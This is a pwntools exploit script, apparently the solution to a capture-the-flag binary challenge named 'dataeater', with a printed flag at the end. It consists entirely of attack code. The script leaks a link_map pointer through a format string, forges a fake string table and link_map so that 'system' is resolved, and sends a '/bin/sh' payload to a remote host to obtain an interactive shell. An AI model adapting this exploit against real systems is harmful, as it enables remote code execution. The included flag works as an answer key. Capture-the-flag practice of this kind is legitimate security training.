from pwn import *
context.arch = 'amd64'

elf = ELF('./dataeater')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# p = elf.process()
p = remote('mc.ax', 31869)


leave_ret_addr = 0x400722
ret_addr = 0x40050e
pop_rbp = 0x4005c8
rbp_target = 0x12345678
buf = 0x601080
bss = 0x601b00

pop_rdi = 0x0000000000400793
pop_rsi_r15 = 0x0000000000400791
pop_rbp = 0x00000000004005c8
ret = 0x000000000040050e
csu_end = 0x40078A
add_rbp_0x3d_ebx = 0x0000000000400628

p.sendline(b'%s%32$s') # %32$s is address of linkmap, IDK why there

buf = 0x601080
addr_fake_dt_strtab = buf + 0x10
addr_fake_strtab = buf + 0x20
fake_dt_strtab = flat([
    5, 
    addr_fake_strtab
])

fake_strtab = b'\x00' * 0x37 + b"system"

fake_linkmap = p64(0) * 8 + p64(0) * 5 + p64(addr_fake_dt_strtab)[:-1]

payload = fit({
    0x0: b"/bin/sh\x00",
    0x10: fake_dt_strtab,
    0x20: fake_strtab,
}, filler = b'\x00')
payload += b' ' + fake_linkmap

raw_input()
p.sendline(payload)

p.interactive()

# dice{1nfin1t3_f1v3_lin3_ch4lls_f46297a09e671c6a}
